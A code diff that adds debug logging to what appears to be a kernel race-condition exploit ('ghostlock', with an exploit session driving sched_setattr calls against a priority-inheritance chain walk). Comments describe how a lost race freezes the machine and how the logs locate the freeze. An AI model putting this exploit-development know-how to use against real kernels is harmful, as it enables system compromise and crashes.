@@ -205,6 +205,14 @@ namespace ghostlock::race {
                     int32_t consumer_nice = session::g_exploit_session.profile.has_compact_waiter()
                                             ? (calls_this_seq % 19) + 1
                                             : kernel::PSELECT_CONSUMER_NICE;
+                    /* Pre-call breadcrumb: this is the last line that must be on
+                     * disk before the PI walk is entered. Comparing it with the
+                     * post-call line below splits the two candidates for a lost
+                     * race -- freeze inside the walk (post-call line missing) vs
+                     * freeze somewhere else entirely (pre-call line missing). */
+                    pr_info("consumer call %d entering sched_setattr tid=%d nice=%d\n",
+                            calls_this_seq + 1, tid, consumer_nice);
+                    support::log_sync();
                     long sched_ret = support::sched_setattr_tid(tid, consumer_nice);
                     if (sched_ret != 0) {
                         struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
@@ -219,6 +227,18 @@ namespace ghostlock::race {
                     if (sched_ret == 0) race->consumer_success.fetch_add(1);
                     race->consumer_inflight.store(0);
                     calls_this_seq++;
+                    /* Localisation breadcrumb. This syscall is what walks the PI
+                     * chain, and a lost race turns that walk into a spin with
+                     * interrupts off: the machine freezes instead of oopsing, so
+                     * kmsg records nothing and the route never reaches its own
+                     * post-select line. Fsyncing here splits the two candidates:
+                     * if the gate line is the last thing on disk the walk never
+                     * returned; if this line is there, it did and the freeze is
+                     * on the waiter's side instead. */
+                    pr_info("consumer call %d sched_ret=%ld errno=%d success=%d\n",
+                            calls_this_seq, sched_ret, errno,
+                            race->consumer_success.load());
+                    support::log_sync();
                     if (static_cast<uint32_t>(calls_this_seq) >=
                         session::g_exploit_session.profile.select_consumer_max_calls()) {
                         race->consumer_go.store(0);
